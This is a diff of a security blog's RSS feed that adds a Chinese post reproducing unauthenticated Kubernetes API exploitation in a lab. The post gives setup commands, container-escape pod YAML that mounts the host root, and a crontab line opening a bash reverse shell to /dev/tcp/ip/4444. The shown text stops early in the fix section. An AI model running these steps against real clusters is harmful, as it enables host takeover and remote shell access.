@@ -1,4 +1,304 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Talk on baozongwi's blog</title><link>https://baozongwi.xyz/categories/talk/</link><description>Recent content in Talk on baozongwi's blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><copyright>baozongwi</copyright><lastBuildDate>Mon, 29 Sep 2025 09:04:12 +0800</lastBuildDate><atom:link href="https://baozongwi.xyz/categories/talk/index.xml" rel="self" type="application/rss+xml"/><item><title>Kubernetes基础入门使用</title><link>https://baozongwi.xyz/p/kubernetes-getting-started-tutorial/</link><pubDate>Mon, 29 Sep 2025 09:04:12 +0800</pubDate><guid>https://baozongwi.xyz/p/kubernetes-getting-started-tutorial/</guid><description>&lt;h2 id="概念">概念
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Talk on baozongwi's blog</title><link>https://baozongwi.xyz/categories/talk/</link><description>Recent content in Talk on baozongwi's blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><copyright>baozongwi</copyright><lastBuildDate>Wed, 01 Oct 2025 10:01:15 +0800</lastBuildDate><atom:link href="https://baozongwi.xyz/categories/talk/index.xml" rel="self" type="application/rss+xml"/><item><title>K8s Remote Api未授权利用</title><link>https://baozongwi.xyz/p/kubernetes-remote-api-unauthorized/</link><pubDate>Wed, 01 Oct 2025 10:01:15 +0800</pubDate><guid>https://baozongwi.xyz/p/kubernetes-remote-api-unauthorized/</guid><description>&lt;h2 id="环境搭建">环境搭建
+&lt;/h2>&lt;p>6443、8080、10250端口未授权利用漏洞&lt;/p>
+&lt;p>搭建k8s集群🥵，这里卡了很久。我是真的红温了🤬（byd用引用的文章里面写的根本不行）&lt;/p>
+&lt;p>**k8s1.16.0以下版本默认启用8080端口（无认证）。**我们只需要用一个不弃用8080端口的再修改配置就可以了&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">./metarget gadget install k8s --version 1.16.5
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>方便等会复现漏洞，我们起一个nginx&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">apiVersion&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">v1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">kind&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Pod&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">metadata&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">nginx-pod&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">containers&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">nginx-container&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">nginx:1.16.1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">ports&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">containerPort&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">80&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="l">kubectl apply -f nginx-pod.yaml&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="l">kubectl get pods&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c"># 测试一下8080是否是未授权&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="l">curl http://localhost:8080/api/v1/namespaces/default/pods&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>修改8080端口服务&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo vim /etc/kubernetes/manifests/kube-apiserver.yaml
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- --insecure-port&lt;span class="o">=&lt;/span>&lt;span class="m">8080&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- --insecure-bind-address&lt;span class="o">=&lt;/span>0.0.0.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo systemctl restart kubelet
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>配置dashboard&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v1.10.1/src/deploy/recommended/kubernetes-dashboard.yaml
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 修改 Dashboard 允许 HTTP 访问&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kubectl patch deployment kubernetes-dashboard -n kube-system --type&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;json&amp;#39;&lt;/span> -p&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;add&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/spec/template/spec/containers/0/args/-&amp;#34;, &amp;#34;value&amp;#34;: &amp;#34;--enable-insecure-login&amp;#34;}]&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kubectl patch deployment kubernetes-dashboard -n kube-system --type&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;json&amp;#39;&lt;/span> -p&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;add&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/spec/template/spec/containers/0/args/-&amp;#34;, &amp;#34;value&amp;#34;: &amp;#34;--enable-skip-login&amp;#34;}]&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>创建管理员用户&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">apiVersion&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">v1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">kind&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ServiceAccount&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">metadata&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">admin-user&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">namespace&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">kube-system&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nn">---&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">apiVersion&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">rbac.authorization.k8s.io/v1beta1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">kind&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ClusterRoleBinding&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">metadata&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">admin-user&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">roleRef&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">apiGroup&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">rbac.authorization.k8s.io&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">kind&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ClusterRole&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">cluster-admin&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">subjects&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>- &lt;span class="nt">kind&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ServiceAccount&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">admin-user&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">namespace&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">kube-system&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>应用并且尝试获取管理员token&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl apply -f dashboard-admin.yaml
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kubectl -n kube-system describe secret &lt;span class="k">$(&lt;/span>kubectl -n kube-system get secret &lt;span class="p">|&lt;/span> grep admin-user &lt;span class="p">|&lt;/span> awk &lt;span class="s1">&amp;#39;{print $1}&amp;#39;&lt;/span>&lt;span class="k">)&lt;/span> &lt;span class="p">|&lt;/span> grep token:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kubectl port-forward -n kube-system service/kubernetes-dashboard 9090:80 --address 0.0.0.0
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="漏洞复现">漏洞复现
+&lt;/h2>&lt;h3 id="8080端口未授权">8080端口未授权
+&lt;/h3>&lt;h4 id="已有pod可控">已有pod可控
+&lt;/h4>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl -s ip:8080 get nodes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kubectl -s ip:8080 get pods
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>正常获取到刚才创建的nginxPod，执行命令进入&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl -s ip:8080 &lt;span class="nb">exec&lt;/span> -it nginx-pod -n default bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="新建pod逃逸至宿主机">新建pod逃逸至宿主机
+&lt;/h4>&lt;p>将宿主机根目录挂载到&lt;code>/mnt&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">apiVersion&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">v1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">kind&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Pod&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">metadata&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">koube&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">containers&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">nginx&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">test-container&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">volumeMounts&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">mountPath&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">/mnt&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">test-volume&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">volumes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">test-volume&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">hostPath&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nt">path&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">/&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>应用配置&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl -s ip:8080 create -f test.yaml
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kubectl -s ip:8080 -n default &lt;span class="nb">exec&lt;/span> -it &lt;span class="nb">test&lt;/span> /bin/bash
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> -e &lt;span class="s2">&amp;#34;* * * * * root bash -i &amp;gt;&amp;amp; /dev/tcp/ip/4444 0&amp;gt;&amp;amp;1\n&amp;#34;&lt;/span> &amp;gt;&amp;gt; /mnt/etc/crontab
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>过一分钟收到反弹shell&lt;/p>
+&lt;h3 id="6443端口未授权">6443端口未授权
+&lt;/h3>&lt;p>一样的新建pod进行逃逸&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl --insecure-skip-tls-verify -s ip:6443 get nodes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kubectl --insecure-skip-tls-verify -s ip:6443 get pods
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kubectl --insecure-skip-tls-verify -s ip:6443 apply -f test.yaml
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kubectl --insecure-skip-tls-verify -s ip:6443 &lt;span class="nb">exec&lt;/span> -it &lt;span class="nb">test&lt;/span> -n default /bin/bash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="kubernetes-dashboard">kubernetes dashboard
+&lt;/h3>&lt;p>最重要的就是能够登陆，只要能登陆就能创造pod&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get sa,secrets -n kubernetes-dashboard
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">kubectl describe secrets admin-user-token-tq2kj -n kubernetes-dashboard
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>然后一样的挂载反弹shell&lt;/p>
+&lt;h2 id="漏洞修复">漏洞修复
+&lt;/h2>&lt;p>直接禁止外部访问&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo vim /etc/kubernetes/manifests/kube-apiserver.yaml
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
